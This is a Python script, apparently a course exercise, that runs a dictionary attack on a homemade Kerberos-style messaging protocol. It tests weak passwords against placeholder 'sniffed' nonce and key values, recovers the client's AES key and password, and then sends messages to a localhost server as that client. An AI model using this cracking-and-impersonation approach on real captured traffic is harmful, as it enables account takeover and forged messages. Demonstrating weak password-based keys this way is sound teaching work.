import sys

from Crypto.Random import get_random_bytes

from Client.api import send_message
from pass_list import weak_passwords
from utils import hash_password, decrypt_aes_cbc

# # Hardcoded parameters which were sniffed # #
# nonce generated by the client - on request (1027)
sniffed__client_nonce = get_random_bytes(8)

# iv - on response (1603)
sniffed__iv__c = get_random_bytes(16)

# an encrypted aes_key - on response (1603)
sniffed__encrypted_aes_key = get_random_bytes(48)

# an encrypted nonce - on response (1603)
sniffed__encrypted_nonce = get_random_bytes(16)

# client id from header block - on request (1027)
sniffed__client_id = get_random_bytes(16)

# server to send a message  - on request(1025)
sniffed__server = {
            'server_id': get_random_bytes(16),
            'name': 'Printer',
            'server_ip': '127.0.0.1',
            'server_port': 8001
        }

# # let's start attacking!
# Start dictionary attack
client_password = None
for curr_pass in weak_passwords:
    hashed_pass = hash_password(curr_pass)

    # decrypt [AES Key] with [Hashed weak password]
    decrypted_nonce = decrypt_aes_cbc(hashed_pass, sniffed__iv__c, sniffed__encrypted_nonce)

    # checking if the nonce that the client generated is equal to a nonce that the server sent back
    if decrypted_nonce == sniffed__client_nonce:
        print('Encryption key found!!!')

        # decrypt [Encrypted aes_key] with [Hashed weak password]
        decrypted_aes_key = decrypt_aes_cbc(hashed_pass, sniffed__iv__c, sniffed__encrypted_aes_key)
        print('decrypted_aes_key: ', decrypted_aes_key)
        print('weak_password: ', curr_pass)
        client_password = curr_pass
        break


if client_password is None:
    print('Dictionary attack did\'nt worked. please add more weak passwords to the list.')
else:
    pass
    # Send message to the Messages Server
    try:
        # send the message to the desired Messages server
        while True:
            message = input("Message:\n")
            send_message(sniffed__client_id, client_password, sniffed__server, message)
    except KeyboardInterrupt:
        print('bye bye. don\'t forget to save the password: ', client_password)
        sys.exit()
    except Exception as e:
        print(e)
        sys.exit()


